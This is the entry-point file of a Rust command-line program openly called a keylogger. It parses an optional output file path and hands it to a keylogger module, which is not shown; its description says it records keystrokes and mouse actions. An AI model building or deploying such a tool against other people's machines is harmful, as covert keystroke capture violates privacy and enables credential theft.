use clap::{App, Arg};

mod keylogger;

fn main() {
    let matches = App::new("keylogger")
        .version("0.1.0")
        .author("DEADBLACKCLOVER <deadblackclover@protonmail.com>")
        .about("Register various user actions - keystrokes on the computer keyboard, movements and mouse keystrokes")
        .arg(
            Arg::with_name("PATH")
                .help("File path")
                .index(1),
        )
        .get_matches();

    let path = matches.value_of("PATH").unwrap_or(".keylogger");

    keylogger::run(String::from(path));
}
